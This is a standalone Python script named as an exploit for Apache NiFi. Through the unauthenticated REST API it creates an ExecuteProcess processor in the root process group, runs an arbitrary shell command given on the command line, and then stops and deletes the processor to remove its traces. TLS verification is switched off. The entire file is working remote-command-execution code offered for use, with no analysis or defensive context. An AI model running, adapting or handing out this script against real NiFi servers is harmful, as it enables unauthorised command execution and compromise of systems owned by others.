import sys
import json
import requests

class Exploit:
    def __init__(self, url):
        self.url = url

    def clean_up(self, processor_id):
        requests.put(
            f"{self.url}/nifi-api/processors/{processor_id}/run-status",
            data=json.dumps({'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}),
            verify=False
        )
        requests.delete(f"{self.url}/nifi-api/processors/{processor_id}/threads", verify=False)

    def exploit(self, command):
        group_id = self.fetch_group()
        if group_id:
            processor_id = self.create_processor(group_id)
            if processor_id:
                self.run_command(processor_id, command)
                self.clean_up(processor_id)

    def run_command(self, processor_id, command):
        payload = {
            'component': {
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'properties': {
                        'Command': command.split()[0],
                        'Command Arguments': " ".join(command.split()[1:]),
                    },
                    'schedulingPeriod': '3600 sec'
                },
                'id': processor_id,
                'state': 'RUNNING'
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        headers = {"Content-Type": "application/json"}
        requests.put(
            f"{self.url}/nifi-api/processors/{processor_id}",
            data=json.dumps(payload),
            headers=headers,
            verify=False
        )

    def fetch_group(self):
        try:
            response = requests.get(f"{self.url}/nifi-api/process-groups/root", verify=False)
            return response.json().get("id")
        except Exception:
            return None

    def create_processor(self, group_id):
        payload = {'component': {'type': 'org.apache.nifi.processors.standard.ExecuteProcess'}, 'revision': {'version': 0}}
        headers = {"Content-Type": "application/json"}
        response = requests.post(
            f"{self.url}/nifi-api/process-groups/{group_id}/processors",
            data=json.dumps(payload),
            headers=headers,
            verify=False
        )
        return response.json().get("id", None)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python nifi.py ip cmd")
    else:
        url = sys.argv[1]  
        command = sys.argv[2] 
        exploit = Exploit(url)
        exploit.exploit(command)
